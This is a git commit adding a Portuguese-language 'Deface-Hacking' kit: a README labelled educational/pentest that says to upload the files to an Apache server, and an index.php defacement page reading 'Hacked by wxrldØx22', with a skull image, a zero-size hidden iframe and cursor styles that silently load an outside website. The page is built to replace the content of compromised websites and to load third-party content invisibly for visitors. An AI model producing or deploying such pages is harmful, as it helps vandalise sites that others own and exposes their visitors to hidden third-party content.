643afb33dd0d4e3980f91a031cb7ae1970639739
wxrld0x22 <wxrld0x22@gmail.com>
2024-09-12 00:25:37 -0300

    Add files via upload

---
+++ deface/README.md
@@ -0,0 +1,31 @@
+# Deface-Hacking - Deface - Hacking - Fins Educacionais - Pentest WEB
+
+## INTRODUÇÃO:
+
+Deface-Hacking é uma Pagina PHP Livre e de Código Aberto que utiliza-se como base para o Deface a Linguagem PHP+HTML;
+
+## INTERFACE:
+![INterface](https://github.com/wxrld0x22/deface/blob/main/deface/Midia/Capturar.png)
+
+
+
+## Instruçoes:
+- Realizar o Download Do Reposítório 
+- Upload em Servidor Apache
+
+## Requerimentos:
+
+- Sistema Operacional Windows (x64/x86)/LINUX;
+- Ram no Minimo de 2GB
+- Server
+
+
+## Redes Sociais (Contato):
+
+Email: wxrld0x22@gmail.com
+
+
+
+
+
+
---
+++ deface/index.php
@@ -0,0 +1,51 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<link rel="shortcut icon" href="http://nanatsunt-hb.weebly.com/uploads/5/0/5/2/50527235/6923438.png?252"/> 
+<title>-Owned- wxrldØx22-</title>
+
+	<meta charset="utf-8">
+	<link href='https://fonts.googleapis.com/css?family=Poiret+One' rel='stylesheet' type='text/css'>
+	<style type="text/css">
+		body {
+			background-color: black;
+		}
+		h1 {
+			font-family: "Poiret One";
+			color: red;
+			font-size: 36pt;
+			text-shadow: red 0 0 5px;
+		}
+		p {
+			font-family: "Poiret One";
+			color: white;
+			font-size: 16pt;
+			text-shadow: white 0 0 5px;
+		}
+	</style>
+</head>
+
+<center>
+		<h1><div style="text-shadow: 5px 5px 5px #333; color:#DF0101;">Hacked by wxrldØx22</h1>
+ 
+
+
+
+		<iframe width="0" height="0" src="https://marqueswebdevelopment.com" frameborder="0" allownetworking=�internal�></iframe>
+	</center>
+
+  <tr>
+<center>
+    <td align="center" valign="top"><p><img src="http://3.bp.blogspot.com/-eBPqGM2wMYI/UwUdZU6lrjI/AAAAAAAAHkA/4X6z4HkCCp0/s1600/PNG+-+Caveira+roxa+neon.png" width="412" height="411" /></p></center>
+
+</body>
+
+<div align="center" style="z-index:9;visibility:visible;"><a href="http://marqueswebdevelopment.com" target="_blank" class="tfc">
+  </a></div><style>HTML,BODY{cursor: url("http://marqueswebdevelopment.com"), url("http://marqueswebdevelopment.com"), auto;}</style>
+</html>
+
+<body>
+	
+		<center><p>Cada sonho que voc&ecirc; deixa pra tr&aacute;s &eacute; um peda&ccedil;o do seu futuro que deixa de existir</p></center> 
+
+<marquee direction=up <P align="center"><center><p>wxrldØx22 - @ielris_dev</center>  </p> </marquee>
